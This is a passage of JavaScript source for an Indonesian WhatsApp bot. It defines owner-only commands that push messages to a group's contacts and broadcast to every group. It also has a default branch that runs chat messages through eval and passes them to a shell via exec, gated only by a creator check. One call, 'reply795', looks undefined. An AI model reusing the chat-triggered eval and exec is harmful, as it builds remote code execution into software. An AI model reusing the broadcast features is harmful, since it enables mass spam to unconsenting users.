      return Dicky.reply(m, "BOT BY Dicky\nPUSH CONTACTS ID\n\n" + "*Pastikan Format Yang Anda Berikan Valid*\n*Contoh*: .pushcontactsid Hallo Kak|5|82738282837389173@g.us")
    } else {
      const isMeki = q.split("|")[2]
      if (!isMeki) {
        return Dicky.reply(m, "BOT BY Dicky\nPUSH CONTACTS ID\n\n" + "*Pastikan format yang anda berikan valid*\n*Contoh*: .pushcontactsid Hallo Kak|5|120363262065845429@g.us")
      } else {
        Dicky.pushContacts(m, isMeki, q)
      }
    }
  }
}
break
case "jpm": {
  if (!isOwner) {
    return reply("ᴍᴀᴀғ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ɪɴɪ ᴅɪᴋᴀʀᴇɴᴀᴋᴀɴ ᴀɴᴅᴀ ʙᴜᴋᴀɴ ᴏᴡɴᴇʀ")
  } else {
    if (isGroup) {
      return reply("Khusus Private Chat")
    } else {
      if (!q) {
        await Dicky.reply(m, "BOT BY Dicky\nCHAT ALL GROUP\n\n" + `*Format Yang Anda Berikan Tidak Valid*\n*Contoh*: ${prefix+command} Hallo Kak|5`)
      } else {
        Dicky.sendChatAllGroup(m, q)
      }
    }
  }
}
break
default:

if (body.startsWith('>')) {
if(!isCreator) return reply(`*[ System Notice ]* cannot access`)
try {
let evaled = await eval(body.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
if (body.startsWith('$')){
if(!isCreator) return reply(`*[ System Notice ]* cannot access`)
qur = body.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply795(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (body.startsWith('<')) {
if(!isCreator) return reply(`*[ System Notice ]* cannot access`)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

}
} catch (err) {
m.reply(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
